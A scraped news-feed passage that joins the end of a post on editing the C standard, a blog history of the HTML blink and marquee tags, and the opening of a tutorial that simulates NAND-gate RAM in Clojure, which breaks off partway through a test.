<p>Sweet, You Wrote a <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2335.pdf">Sick-Nasty Rad Paper</a> And Now It Needs To Be Put In The C Standard! So, how does it get there? Well, you don’t actually write a diff to the standard. At least, not a <em>real</em> diff: the sources to the C standard are hidden from the world to keep them safe, even when the time of Darkness descends upon us. What you write are <em>instructions to the project editor</em> (Hi, That’s Me!), and then I take your instructions and do my Best Effort™ to reflect them in the C Standard. Most of the wording gets approved by the Committee before-hand, and the edits are usually straightforward and simple. <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2517.pdf">For example</a>:</p>

<blockquote>
  <p>RECOMMENDATION: 3.4.3p4 should use a different example of undefined behavior, such as:</p>
  <blockquote>
    <p>EXAMPLE An example of undefined behavior is the behavior on dereferencing a null pointer.</p>
  </blockquote>
</blockquote>

<p>I then take these recommendations/instructions/suggestions and then go beat the LaTeX up on your behalf. One of the biggest benefits of this is that you don’t have to know LaTeX. Or how to build the standard, or any part of that. The Project Editor is the “Layer of Indirection” between you and the actual text of the standard. This also means that I could, in theory, rewrite the entire Standard as a Microsoft Word Document, or rewrite the entire thing in restructuredText and not one of you would know the difference. Or, so that’s the ideal situation, anyhow. Unfortunately, following people’s Standard-editing directives are not always the most straight forward…</p>

<h3 id="instructions-unclear">Instructions Unclear?!</h3>

<p>Accidentally blew off foot.</p>

<p>What the hell does “3.4.3p4” mean? Well, I have to build the standard (or go look at an older one), figure out what section/paragraph you’re referring to, and then fix it. Normally, the C standard evolves at such a devastatingly snail-like pace that this is normally not a problem. However, doing this was a bit tough because of 3 meetings of backlogged changes. There were lots of overlaps between papers, and also just out-and-out strange descriptions for how to change some things that I did not understand at first. Weird nesting in the recent C Floating Point Group’s changes to the standard have been all sorts of fun to integrate.</p>

<p>“Delete these paragraphs, then add some here” okay, is that before or after the stuff you just asked me to destroy? Oh, I just applied a paper that deletes half of what you’re asking me to edit. Uh, well, I guess we’re going to have to brew up some interesting words on the fly…!</p>

<p>“Do these changes, and then make similar changes to the usual places” uh, what are “the usual places”? Guess it’s time to break out find/replace and figure out what the usual places are! Wait, hold on, you made these changes here, but… there’s identical wording somewhere else, am I supposed to edit that too…? Time to e-mail the author…</p>

<p>It’s an interesting bucket of challenges, really. I think one of the ways to help make it so I can more reliably know what sections to edit are by adding stable tags to the standard. C++ has done this and it means when someone says “edit <code>[alg.any.of]</code>”, you know where to go no matter what happens to the section and paragraph numbers. <code>25.6.2</code>… what’s that, what am I doing again?</p>

<p>Some frustrations go beyond just the papers’ contents, though.</p>

<h3 id="n2481-nooo-you-mean-n2553">N2481? Nooo, you mean N2553!</h3>

<p>One of the biggest problems in both the C and C++ Committees are history. C++ began to address this problem by using P-numbers for their papers, which are <code>PNNNNrXYZ</code> numbers that indicate both a paper uniquely and the revision of the paper (0, 1, 2, …) in the <code>XYZ</code> part. C has no such infrastructure: every paper is submitted, officially, to ISO and is given an N-number.</p>

<p>How do you track revision history? You hope the author puts it in the paper title or inside the paper itself. It’s basically up to the author to do this, and not all authors do it. This is a larger problem that is more strictly outside of my purview as Project Editor, but it is something that I am going to tackle anyways.</p>

<p>I had some inspiration thanks to the <a href="https://github.com/LynnKirby/wg14-link">work done by LynnKirby</a>, wherein Lynn created a <a href="https://wg14.link/">wg14.link website, similar to the wg21.link website</a>. This has given me a lot of insight into what people want out of a service like this, and how I should book keep papers and their metadata. Hopefully before Summer of 2021, I will be able to unveil a new way to track these papers and keep title, author, abstract, and history information and make the Paper Submission Process far more friendly to the wider C Community!</p>

<p>Still, this is a lot of rambling and anymore stuff will start to get way off topic to what it means to actually edit the C Standard. …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thephd.github.io/editing-the-c-standard">https://thephd.github.io/editing-the-c-standard</a></em></p>]]>
            </description>
            <link>https://thephd.github.io/editing-the-c-standard</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086673</guid>
            <pubDate>Fri, 13 Nov 2020 19:57:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BLINK And MARQUEE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25086275">thread link</a>) | @AndrewStephens
<br/>
November 13, 2020 | https://danq.me/2020/11/11/blink-and-marquee/ | <a href="https://web.archive.org/web/*/https://danq.me/2020/11/11/blink-and-marquee/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-17879">
  <!-- .entry-header -->

  
          
  <div>
    <p>I was chatting with a fellow web developer recently and made a joke about the <abbr title="Hypertext Markup Language">HTML</abbr> <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code> tags, only to discover that he had no idea what I was talking about. They’re a part of web history that’s fallen off the radar and younger developers are unlikely to have ever come across them. But for a little while, back in the 90s, they were a big deal.</p>
<figure id="attachment_17882" aria-describedby="caption-attachment-17882"><a href="https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee.png"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee.png.pagespeed.ic.EAch8dRDW7.png" alt="Macromedia Dreamweaver 3 code editor window showing a <h2> heading wrapped in <marquee> and <blink> tags, for emphasis." width="1024" height="586" srcset="https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee.png.pagespeed.ic.EAch8dRDW7.png 1024w, https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee-300x172.png.pagespeed.ic.dVroRWDMcZ.png 300w, https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee-768x440.png.pagespeed.ic.yvG55YFdMu.png 768w, https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee-30x17.png.pagespeed.ic.ommuWpqRkf.jpg 30w, https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee-898x514.png.pagespeed.ic.k2buuOHJUs.png 898w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="https://danq.me/wp-content/uploads/2020/11/xdreamweaver-blink-marquee-30x17.png.pagespeed.ic.ommuWpqRkf.jpg" data-lazy-src="https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee.png" data-lazy-srcset="https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee.png 1024w, https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee-300x172.png 300w, https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee-768x440.png 768w, https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee-30x17.png 30w, https://danq.me/wp-content/uploads/2020/11/dreamweaver-blink-marquee-898x514.png 898w"></a><figcaption id="caption-attachment-17882">Even <a href="https://en.wikipedia.org/wiki/Adobe_Dreamweaver">Macromedia Dreamweaver</a>, which embodied the essence of 1990s web design, seemed to treat wrapping <code>&lt;blink&gt;</code> in <code>&lt;marquee&gt;</code> as an antipattern.</figcaption></figure>
<p>Invention of the <code>&lt;blink&gt;</code> element is often credited to <a href="https://montulli.blogspot.com/">Lou Montulli</a>, who wrote pioneering web browser <a href="https://lynx.invisible-island.net/">Lynx</a> before being joining Netscape in 1994. <a href="http://www.montulli.org/theoriginofthe%3Cblink%3Etag">He insists that he didn’t write any of the code</a> that eventually became the first implementation of <code>&lt;blink&gt;</code>. Instead, he claims: while out at a bar (on the evening he’d first meet his wife!), he pointed out that many of the fancy new stylistic elements the other Netscape engineers were proposing wouldn’t work in Lynx, which is a text-only browser. The fanciest conceivable effect that would work across both browsers would be making the text flash on and off, he joked. Then another engineer – who he doesn’t identify – pulled a late night hack session and added it.</p>
<p>And so it was that <a href="https://www.webdesignmuseum.org/old-software/web-browsers/netscape-navigator-2-0">when Netscape Navigator 2.0 was released in 1995</a> it added support for the <code>&lt;blink&gt;</code> tag. Also animated <abbr title="Graphics Interchange Format (file)s">GIFs</abbr> and the first inklings of JavaScript, which collectively would go on to <em>define</em> the “personal website” experience for years to come. Here’s how you’d use it:</p>
<pre><code>&lt;BLINK&gt;This is my blinking text!&lt;/BLINK&gt;</code></pre>
<p>With no attributes, it was clear from the outset that this tag was supposed to be a joke. By the time <abbr title="Hypertext Markup Language, version 4">HTML4</abbr> was published as a a recommendation two years later, <a href="https://www.w3.org/Style/HTML40-plus-blink.dtd">it was <em>documented</em> as being a joke</a>. But the Web of the late 1990s saw it used <em>a lot</em>. If you wanted somebody to notice the “latest updates” section on your personal home page, you’d wrap a <code>&lt;blink&gt;</code> tag around the title (or, if you were a sadist, the entire block).</p>
<figure id="attachment_17890" aria-describedby="caption-attachment-17890"><a href="https://www.cameronsworld.net/"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/640x300xcamerons-world-1024x480.jpg.pagespeed.ic.soAReCqIvk.jpg" alt="Cameron's World website, screenshot, showing GIFS and bright pallette" width="640" height="300" srcset="https://danq.me/wp-content/uploads/2020/11/xcamerons-world-1024x480.jpg.pagespeed.ic.TW2ayvZwa_.jpg 1024w, https://danq.me/wp-content/uploads/2020/11/camerons-world-300x141.jpg 300w, https://danq.me/wp-content/uploads/2020/11/xcamerons-world-768x360.jpg.pagespeed.ic.PnBNi_ZzkO.jpg 768w, https://danq.me/wp-content/uploads/2020/11/xcamerons-world-1536x719.jpg.pagespeed.ic.kgt0LqD7u1.jpg 1536w, https://danq.me/wp-content/uploads/2020/11/xcamerons-world-2048x959.jpg.pagespeed.ic.GeE2X9YNIi.jpg 2048w, https://danq.me/wp-content/uploads/2020/11/camerons-world-30x14.jpg 30w, https://danq.me/wp-content/uploads/2020/11/xcamerons-world-898x421.jpg.pagespeed.ic.Uin4JlSD6C.jpg 898w" sizes="(max-width: 640px) 100vw, 640px" data-old-src="https://danq.me/wp-content/uploads/2020/11/camerons-world-30x14.jpg" data-lazy-src="https://danq.me/wp-content/uploads/2020/11/camerons-world-1024x480.jpg" data-lazy-srcset="https://danq.me/wp-content/uploads/2020/11/camerons-world-1024x480.jpg 1024w, https://danq.me/wp-content/uploads/2020/11/camerons-world-300x141.jpg 300w, https://danq.me/wp-content/uploads/2020/11/camerons-world-768x360.jpg 768w, https://danq.me/wp-content/uploads/2020/11/camerons-world-1536x719.jpg 1536w, https://danq.me/wp-content/uploads/2020/11/camerons-world-2048x959.jpg 2048w, https://danq.me/wp-content/uploads/2020/11/camerons-world-30x14.jpg 30w, https://danq.me/wp-content/uploads/2020/11/camerons-world-898x421.jpg 898w"></a><figcaption id="caption-attachment-17890">If you missed this particular chapter of the Web’s history, you can simulate it at <a href="https://www.cameronsworld.net/">Cameron’s World</a>.</figcaption></figure>
<p>In the same year as Netscape Navigator 2.0 was released, <a href="https://www.webdesignmuseum.org/old-software/web-browsers/internet-explorer-2-0">Microsoft released Internet Explorer 2.0</a>. At this point, Internet Explorer was still very-much playing catch-up with the features the Netscape team had implemented, but clearly some senior Microsoft engineer took a look at the <code>&lt;blink&gt;</code> tag, refused to play along with the joke, but had an innovation of their own: the <code>&lt;marquee&gt;</code> tag! It had <a href="http://www.lissaexplains.com/fun3.shtml">a whole suite of attributes</a> to control the scroll direction, speed, and whether it looped or bounced backwards and forwards. While <code>&lt;blink&gt;</code> encouraged disgusting and inaccessible design as a joke, <code>&lt;marquee&gt;</code> did it on purpose.</p>
<pre><code>&lt;MARQUEE&gt;Oh my god this still works in most modern browsers!&lt;/MARQUEE&gt;</code></pre>
<blockquote><p><marquee>Oh my god this still works in most modern browsers!</marquee></p>

</blockquote>
<p>But here’s the interesting bit: for a while in the late 1990s, it became a somewhat common practice to wrap content that you wanted to emphasise with animation in <em>both</em> a <code>&lt;blink&gt;</code> and a <code>&lt;marquee&gt;</code> tag. That way, the Netscape users would see it flash, the <abbr title="Internet Explorer">IE</abbr> users would see it scroll or bounce. Like this:</p>
<pre><code>&lt;MARQUEE&gt;&lt;BLINK&gt;This is my really important message!&lt;/BLINK&gt;&lt;/MARQUEE&gt;</code></pre>
<figure id="attachment_17887" aria-describedby="caption-attachment-17887"><a href="https://danq.me/wp-content/uploads/2020/11/IE5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/IE5.gif" alt="Internet Explorer 5 showing a marquee effect." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xIE5-30x23.gif.pagespeed.ic.V9MhE6Bblw.jpg"></a><figcaption id="caption-attachment-17887">Wrap a <code>&lt;blink&gt;</code> inside a <code>&lt;marquee&gt;</code> and <abbr title="Internet Explorer">IE</abbr> users will see the marquee. Delightful.</figcaption></figure>
<p>The web has always been built on <a href="https://en.wikipedia.org/wiki/Robustness_principle">Postel’s Law</a>: a web browser should assume that it won’t understand everything it reads, but it should provide a best-effort rendering for the benefit of its user anyway. Ever wondered why the modern <code>&lt;video&gt;</code> element is a block rather than a self-closing tag? It’s so you can embed <em>within</em> it code that an earlier browser – one that doesn’t understand <code>&lt;video&gt;</code> – can read (a browser’s default state when seeing a new element it doesn’t understand is to ignore it and carry on). So embedding a <code>&lt;blink&gt;</code> in a <code>&lt;marquee&gt;</code> gave you the best of both worlds, right? <em>(welll…)</em></p>
<figure id="attachment_17889" aria-describedby="caption-attachment-17889"><a href="https://danq.me/wp-content/uploads/2020/11/Netscape5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Netscape5.gif" alt="Netscape Navigator 5 showing a blink effect." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xNetscape5-30x23.gif.pagespeed.ic.7MCcOVo4rn.jpg"></a><figcaption id="caption-attachment-17889">Wrap a <code>&lt;blink&gt;</code> inside a <code>&lt;marquee&gt;</code> and Netscape users will see the blink. Joy.</figcaption></figure>
<p>Better yet, you were safe in the knowledge that anybody using a browser that didn’t understand <em>either</em> of these tags could <em>still read your content</em>. Used properly, the web is about <em>progressive enhancement</em>. Implement for everybody, enhance for those who support the shiny features. JavaScript and <abbr title="Cascading Style Sheets">CSS</abbr> can be applied with the same rules, and doing so pays dividends in maintainability and accessibility (though, sadly, that doesn’t stop people writing sites that needlessly <em>require</em> these technologies).</p>
<figure id="attachment_17891" aria-describedby="caption-attachment-17891"><a href="https://danq.me/wp-content/uploads/2020/11/Opera5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Opera5.gif" alt="Opera 5 showing no blinking nor marquee text." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xOpera5-30x23.gif.pagespeed.ic.lyeZs3hC1_.jpg"></a><figcaption id="caption-attachment-17891">Personally, I was a (paying! – back when people used to pay for web browsers!) Opera user so I mostly saw neither <code>&lt;blink&gt;</code> nor <code>&lt;marquee&gt;</code> elements. I don’t feel like I missed out.</figcaption></figure>
<p>I remember, though, the first time I tried Netscape 7, in 2002. Netscape 7 and its close descendent are, as far as I can tell, the only web browsers to support <em>both</em> <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code>. Even then, it was picky about the order in which they were presented and the elements wrapped-within them. But support was good enough that some people’s personal web pages suddenly began to exhibit the most ugly effect imaginable: the combination of both scrolling and flashing text.</p>
<figure id="attachment_17892" aria-describedby="caption-attachment-17892"><a href="https://danq.me/wp-content/uploads/2020/11/Netscape7.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Netscape7.gif" alt="Netscape 7 showing text that both blinks and marquee-scrolls." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xNetscape7-30x23.gif.pagespeed.ic.2Feg-ZbrR7.jpg"></a><figcaption id="caption-attachment-17892">If Netscape 7’s <abbr title="User Interface">UI</abbr> didn’t already make your eyes bleed (I’ve toned it down here by installing the “classic skin”), its simultaneous rendering of <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code> would.</figcaption></figure>
<p>The <code>&lt;blink&gt;</code> tag is very-definitely <a href="https://caniuse.com/?search=blink">dead</a> (<a href="http://tstbtbt.com/">hurrah!</a>), but you can <a href="https://www.w3docs.com/snippets/css/how-to-create-a-blinking-effect-with-css3-animations.html">bring it back with pure&nbsp;</a><abbr title="Cascading Style Sheets"><a href="https://www.w3docs.com/snippets/css/how-to-create-a-blinking-effect-with-css3-animations.html">CSS</a></abbr> if you must. <code>&lt;marquee&gt;</code>, amazingly, still <a href="https://caniuse.com/?search=marquee">survives</a>, not only in <a href="https://remysharp.com/2008/09/10/the-silky-smooth-marquee/">polyfills</a> but <em>natively</em>, as you might be able to see above. However, if you’re in any doubt as to whether or not you should use it: you shouldn’t. If you’re looking for digital nostalgia, <a href="https://theoutline.com/post/8442/internet-nostalgia-2010s-geocities-tumblr-vaporwave">there’s a whole rabbit hole to dive down</a>, but you don’t need to inflict <code>&lt;marquee&gt;</code> on the rest of us.</p>

      </div><!-- .entry-content -->

  <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://danq.me/2020/11/11/blink-and-marquee/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086275</guid>
            <pubDate>Fri, 13 Nov 2020 19:21:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating RAM in Clojure]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25086256">thread link</a>) | @stopachka
<br/>
November 13, 2020 | https://stopa.io/post/258 | <a href="https://web.archive.org/web/*/https://stopa.io/post/258">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><p>“Computers are all made out of logic gates”. We’ve heard that saying before. We also have a sense that logic gates are very simple machines, analogous to light switches even. This raises the question: <em>how exactly do kind-of-light-switches come together to form computers</em>? How does “storing a variable” or “calling a function” translate into logic gates going on or off? </p><p>On a journey to answer that question, I discovered J Clark Scott’s excellent book <a href="https://www.amazon.com/But-How-Know-Principles-Computers-ebook/dp/B00F25LEVC" target="_blank">“How do It Know?</a>”. He starts with NAND gates and takes you on a journey to build a computer using them.</p><p>I liked his book so much that I took his schematic for RAM, and simulated it in Clojure. In this essay, I’ll guide you through doing just that: we’ll simulate NAND gates, and use about <em>14 thousand</em> of them to build 256 bytes of RAM.</p><p>Going through this simulation ingrained an “aha” feeling in me: watching 14 thousand little machines chug away makes you feel that whoever uses a computer is a wizard. A wizard with an army of millions of machine servants doing billions of little jobs for them every second. I hope it gives you the same feeling. 🙂</p><p>To grok this essay, you need to understand this picture:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NDk4LTdhY2RkMzgwLTBjOTItMTFlYi04NWQ2LTZmOWEzNGE2NmU5Zi5wbmc" alt="image"></span></p><p>This describes a NAND gate. A NAND gate is a machine that has two input wires. If both input wires have a “high” charge (represented as 1), the output charge is “low” (represented as zero). With any other combination of input charges, the output charge is high.</p><p>Notice that the wires carry a charge, but we choose to interpret <em>meaning</em> in the charge. “high charge” means 1, and “low charge” means 0. Nothing changes in the machine, this is just something we decided as humans (1).</p><p>On the left you see a circuit diagram. You can read it as input wires <code>a</code> and <code>b</code> carrying charges into the <code>NAND</code> gate. The <code>NAND</code> gate has a wire <code>c</code>, carrying the output charge. For all the circuit diagrams we’ll draw, you can read them as electricity “flowing” from left to right, or top to bottom.</p><p>On the right is a “truth” table for a NAND gate. This is just a fancy name for summarizing every state a <code>NAND</code> gate can be, based on the input wires.</p><p>Now, we can start even lower than a <code>NAND gate</code>, but this machine is simple enough. It can’t be so hard to build something that turns off when two inputs are turned on. You don’t have to take my word for it though, you can search up “building a NAND gate with transistors”, and come back when you’re convinced. </p><p>Time to code! 🙂</p><p>First things first, we need some way to represent the state of our circuit. We know that our RAM will be built completely from <code>NAND</code> gates, so let’s take inspiration from one:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTI0LTg0NTczYjgwLTBjOTItMTFlYi05NWMyLWJlMWQ4MzFlNTg5MC5wbmc" alt="image"></span></p><p>If we look at this example we can see that:</p><ol><li>We have wires. </li><li>Wires have charges.</li><li>We hook wires together with NAND Gates</li></ol><p>Here’s one way we can map that to a data structure in Clojure: </p><pre><code><span>(</span><span>def</span><span> ex-state-v0 {</span><span>:charge-map</span><span> {</span><span>:a</span><span> </span><span>1</span><span> </span><span>:b</span><span> </span><span>1</span><span> </span><span>:c</span><span> </span><span>0</span><span>}</span>
<span>                  </span><span>:nand-gates</span><span> [{</span><span>:ins</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>]</span>
<span>                                </span><span>:out</span><span> </span><span>:c</span><span>}]})</span></code></pre><p>We can use keywords to represent our wires. We can also keep a map that tells us the charges of our wires. Finally, we can keep a list of NAND gates, which tell us how these wires connect. </p><p>Fine enough way to represent our circuit for now! Let’s create a few functions that can help us manage this representation:</p><pre><code><span>; update state v0</span>
<span>; ---------------</span>
<!-- -->
<span>(</span><span>def</span><span> empty-state {</span><span>:charge-map</span><span> {} </span><span>:nand-gates</span><span> []})</span>
<!-- -->
<span>(</span><span>defn</span><span> charge [state wire]</span>
<span>  (</span><span>get-in</span><span> state [</span><span>:charge-map</span><span> wire]))</span>
<!-- -->
<span>(</span><span>defn</span><span> charges [state wires]</span>
<span>  (</span><span>map</span><span> (</span><span>partial</span><span> charge state) wires))</span>
<!-- -->
<span>(</span><span>defn</span><span> set-charge [state wire charge]</span>
<span>  (</span><span>assoc-in</span><span> state [</span><span>:charge-map</span><span> wire] charge))</span>
<!-- -->
<span>(</span><span>defn</span><span> wire-nand-gate [state a b o]</span>
<span>  (</span><span>update</span><span> state </span><span>:nand-gates</span><span> conj {</span><span>:ins</span><span> [a b] </span><span>:out</span><span> o}))</span></code></pre><p>These are all the basic tools we need to “connect” a NAND gate into our circuit. Let’s try them out in the REPL:</p><pre><code><span>(</span><span>charges</span><span> (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>set-charge</span><span> </span><span>:a</span><span> </span><span>1</span><span>)</span>
<span>               (</span><span>set-charge</span><span> </span><span>:b</span><span> </span><span>0</span><span>))</span>
<span>           [</span><span>:a</span><span> </span><span>:b</span><span>])</span>
<span>; =&gt; (1 0)</span>
<span>(</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>)</span>
<span>; =&gt; {:charge-map {}, :nand-gates [{:ins [:a :b], :out :c}]}</span></code></pre><p>Nice! We can now “wire” up a circuit. Let’s run some electricity through it.</p><p>To figure out how to simulate electricity into our circuit, let’s remember our diagram again:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTU3LTk0NmYxYjAwLTBjOTItMTFlYi05NGZkLTNlM2JkMzI5OWYwNC5wbmc" alt="image"></span></p><p>One way we can model this is to imagine that electricity is like water: It “flows” from sources into wires, and “triggers” all the devices that are connected to those wires.</p><p>With a model like that, here’s what would happen if a charge was “triggered” on <code>a</code>:</p><ol><li>First, <code>a</code>‘s charge would update. </li><li>After that <code>a</code> ‘s charge would transfer to all the NAND gates that are connected to it. In this case, it would be our one NAND gate above.</li><li>Each NAND gate would then recompute its charge, and if it changed, trigger its output wire in turn. In our case that’s <code>c</code> </li><li>If <code>c</code> was connected to other <code>NAND</code> gates, those gates would trigger, and the process would continue.</li></ol><p>Now, this is a very naive view of how electricity works (2), but it’s good enough for us to model RAM!</p><p>Let’s translate this into code.</p><p>To do that, we need a way to model what a <code>NAND</code> gate does:</p><pre><code><span>(</span><span>defn</span><span> nand-output [a b]</span>
<span>  (</span><span>if</span><span> (</span><span>=</span><span> a b </span><span>1</span><span>) </span><span>0</span><span> </span><span>1</span><span>))</span></code></pre><pre><code><span>(</span><span>nand-output</span><span> </span><span>0</span><span> </span><span>0</span><span>)</span>
<span>; =&gt; 1</span>
<span>(</span><span>nand-output</span><span> </span><span>1</span><span> </span><span>1</span><span>)</span>
<span>; =&gt; 0</span></code></pre><p>Our <code>nand-output</code> function takes two input charges, and produces the output charge that a <code>NAND</code> gate would produce.</p><p>Next, we need a function to find all the <code>NAND</code> gates that are connected to a specific wire:</p><pre><code><span>(</span><span>defn</span><span> dependent-nand-gates [state wire]</span>
<span>  (</span><span>filter</span><span> </span>
<span>    (</span><span>fn</span><span> [{</span><span>:keys</span><span> [ins]}] (</span><span>some</span><span> #{wire} ins)) </span>
<span>    (</span><span>:nand-gates</span><span> state)))</span></code></pre><pre><code><span>(</span><span>dependent-nand-gates</span><span> (</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>) </span><span>:a</span><span>)</span>
<span>; =&gt; ({:ins [:a :b], :out :c})</span></code></pre><p>This searches all of our <code>NAND</code> gates in our circuit, and finds the ones which are connected to a specific wire.</p><p>With that, we have what we need to implement <code>trigger</code>:</p><pre><code><span>(</span><span>declare</span><span> trigger-nand-gate)</span>
<span>(</span><span>defn</span><span> trigger</span>
<span>  ([state wire new-v]</span>
<span>   (</span><span>let</span><span> [old-charge (</span><span>charge</span><span> state wire)</span>
<span>         state' (</span><span>set-charge</span><span> state wire new-v)</span>
<span>         new-charge (</span><span>charge</span><span> state' wire)]</span>
<span>     (</span><span>if</span><span> (</span><span>=</span><span> old-charge new-charge)</span>
<span>       state'</span>
<span>       (</span><span>reduce</span><span> (</span><span>fn</span><span> [acc-state out] (</span><span>trigger-nand-gate</span><span> acc-state out))</span>
<span>               state'</span>
<span>               (</span><span>dependent-nand-gates</span><span> state' wire))))))</span></code></pre><p>This follows exactly the model we described: </p><ol><li>Update the charge of the wire that was triggered </li><li>Find all the <code>NAND</code>  gates that the wire was connected too</li><li>Trigger those <code>NAND</code> gates if needed. </li></ol><p>What’s left is to implement what a  <code>NAND</code> gate does when it is triggered:</p><pre><code><span>(</span><span>defn</span><span> trigger-nand-gate</span>
<span>  [state {</span><span>:keys</span><span> [ins out]}]</span>
<span>  (</span><span>let</span><span> [new-charge (</span><span>apply</span><span> nand-output (</span><span>charges</span><span> state ins))]</span>
<span>    (</span><span>trigger</span><span> state out new-charge)))</span></code></pre><p>This calculates the new charge of a  <code>NAND</code> gate, and triggers the <code>output</code> wire with that charge. </p><p>Great, we have a way to simulate charges flowing through NAND gates! </p><p>One final helper function: let’s create something that will will let us “trigger” many wires: </p><pre><code><span>(</span><span>defn</span><span> trigger-many [state wires charges]</span>
<span>  (</span><span>reduce</span>
<span>    (</span><span>fn</span><span> [acc-state [wire charge]]</span>
<span>      (</span><span>trigger</span><span> acc-state wire charge))</span>
<span>    state</span>
<span>    (</span><span>map</span><span> vector wires charges)))</span></code></pre><p>We’ll want to do this so much that it’s good to have around.</p><p>We have what we need to simulate a simple charge flowing through a NAND gate. Let’s write a test for that:</p><pre><code><span>(</span><span>deftest</span><span> test-nand-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-nand-gate</span><span> </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger-many</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>] [</span><span>1</span><span> </span><span>0</span><span>]))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:b</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"just a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"both a and b are on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>1</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; Ran 1 test containing 2 assertions.</span>
<span>; No failures.</span></code></pre><p>Works like a charm! </p><p>What would happen, if we took a NAND gate, and fed the <em>same</em> wire in both inputs? </p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTc3LTlkZjg4MzAwLTBjOTItMTFlYi04M2VmLTMwNDViYTQ1YWM5Mi5wbmc" alt="image"></span></p><p>Well, the output would end up being the opposite of its input. When <code>a</code> is zero, <code>c</code> is 1, when <code>a</code> is 1, <code>c</code> is 0. Boom, that happens to be a <code>NOT</code> gate. Here’s how that looks: </p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTk5LWEzZWU2NDAwLTBjOTItMTFlYi05YWFjLTYwM2E4MmQzNmVjNS5wbmc" alt="image"></span></p><p>To implement our <code>NOT</code> gate, we can do exactly as our diagram described: Feed the same wire to <em>both</em> inputs of a <code>NAND</code> gate: </p><pre><code><span>(</span><span>defn</span><span> wire-not-gate</span>
<span>  ([state a o]</span>
<span>   (</span><span>wire-nand-gate</span><span> state a a o)))</span></code></pre><p>🤯 1 line of code. If we test that out…</p><pre><code><span>(</span><span>deftest</span><span> test-not-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-not-gate</span><span> </span><span>:a</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger</span><span> </span><span>:a</span><span> </span><span>0</span><span>))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
